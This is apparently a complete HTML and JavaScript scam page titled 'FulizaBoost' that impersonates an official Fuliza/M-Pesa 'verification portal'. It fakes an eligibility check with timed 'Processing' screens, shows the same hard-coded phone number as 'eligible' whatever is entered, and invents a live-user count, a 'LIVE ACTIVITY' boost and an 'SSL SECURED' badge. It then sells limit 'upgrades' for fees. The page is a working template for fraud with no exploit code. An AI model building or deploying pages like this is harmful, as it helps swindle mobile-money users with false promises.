<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>

<style>
body {
  font-family: Arial, sans-serif;
  background: #f3f4f6;
  margin: 0;
  padding: 20px;
  text-align: center;
}

/* CARD */
.card {
  background: white;
  padding: 25px;
  border-radius: 25px;
  max-width: 400px;
  margin: auto;
  box-shadow: 0 5px 25px rgba(0,0,0,0.1);
}

/* STEP 1 */
.icon {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  background: #e8f5e9;
  margin: auto;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size: 30px;
}

.subtitle {
  color: #16a34a;
  font-size: 12px;
  letter-spacing: 1px;
}

.desc {
  color: #666;
  font-size: 14px;
  margin: 10px 0 20px;
}

.input {
  width: 100%;
  padding: 15px;
  border-radius: 14px;
  border: none;
  background: #f1f5f9;
}

.green {
  background: #1f9d47;
  color: white;
  padding: 15px;
  border-radius: 14px;
  border: none;
  width: 100%;
  margin-top: 15px;
  font-weight: bold;
}

.footer {
  margin-top: 15px;
  font-size: 12px;
  display: flex;
  justify-content: space-between;
  color: #777;
}

/* SUCCESS */
.success-icon {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  background: #1f9d47;
  color: white;
  font-size: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:auto;
}

.phone {
  color: #16a34a;
  font-weight: bold;
}

/* STEP 7 */
.header-title {
  font-size: 24px;
  font-weight: bold;
}

.sub-head {
  color:#777;
  font-size: 14px;
}

.activity {
  background:#f1f5f9;
  padding:12px;
  border-radius:12px;
  margin:15px 0;
  text-align:left;
  font-size:14px;
}

.grid {
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:10px;
}

.box {
  padding:15px;
  border-radius:12px;
  background:#fff;
  border:1px solid #eee;
}

.box.active {
  border:2px solid #16a34a;
  background:#e8f5e9;
}

.fee {
  font-size:12px;
  color:#777;
}

/* FIXED BUTTON */
.bottom-btn {
  position:fixed;
  bottom:10px;
  left:10px;
  right:10px;
  background:#1f9d47;
  color:white;
  padding:16px;
  border-radius:14px;
  font-weight:bold;
}
</style>
</head>

<body>

<div id="app"></div>

<script>
let step = 1;
let selectedAmount = 12500;

const limits = [
  {amount:3000, fee:250},
  {amount:5000, fee:293},
  {amount:7500, fee:350},
  {amount:10000, fee:500},
  {amount:12500, fee:747},
  {amount:16000, fee:898},
  {amount:21000, fee:1015},
  {amount:25500, fee:1220},
  {amount:30000, fee:1533},
  {amount:35000, fee:1730},
  {amount:45000, fee:2000},
  {amount:60000, fee:2250},
  {amount:70000, fee:2500}
];

function render(){
  const app = document.getElementById("app");

  /* STEP 1 */
  if(step === 1){
    app.innerHTML = `
    <div class="card">
      <div class="icon">👤🛡️</div>
      <h2>Fuliza Plus+</h2>
      <p class="subtitle">OFFICIAL VERIFICATION PORTAL</p>
      <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
      <input class="input" placeholder="Enter M-Pesa Number">
      <button class="green" onclick="next()">Check My Eligibility →</button>
      <div class="footer">
        <span>● 136 USERS ONLINE</span>
        <span>🔒 SSL SECURED</span>
      </div>
    </div>`;
  }

  /* LOADING */
  if(step >=2 && step <=5){
    app.innerHTML = `<div class="card"><h3>Processing...</h3></div>`;
    setTimeout(()=>{ step++; render(); }, 1000);
  }

  /* STEP 6 */
  if(step === 6){
    app.innerHTML = `
    <div class="card">
      <div class="success-icon">✔</div>
      <h2>Congratulations!</h2>
      <p>
        High Trust Score Detected. 
        <span class="phone">0704343709</span> is eligible for a boost.
      </p>
      <button class="green" onclick="next()">Proceed to Upgrade Limit</button>
    </div>`;
  }

  /* STEP 7 */
  if(step === 7){
    app.innerHTML = `
    <div>

      <div class="header-title">FulizaBoost</div>
      <div class="sub-head">Instant Limit Increase • Same Day Access</div>

      <div class="activity">
        <b>LIVE ACTIVITY</b><br>
        Brian O. (0725****80) boosted to <b style="color:#16a34a">Ksh 21,000</b> just now
      </div>

      <h3>Select Your New Approved Limit</h3>

      <div class="grid">
        ${limits.map(l=>`
          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
            <strong>Ksh ${l.amount}</strong>
            <div class="fee">FEE: KSH ${l.fee}</div>
          </div>
        `).join("")}
      </div>

      <div class="bottom-btn">
        ⚡ UPGRADE TO KSH ${selectedAmount}
      </div>

    </div>`;
  }
}

function next(){
  step++;
  render();
}

function select(a){
  selectedAmount = a;
  render();
}

render();
</script>

</body>
</html>
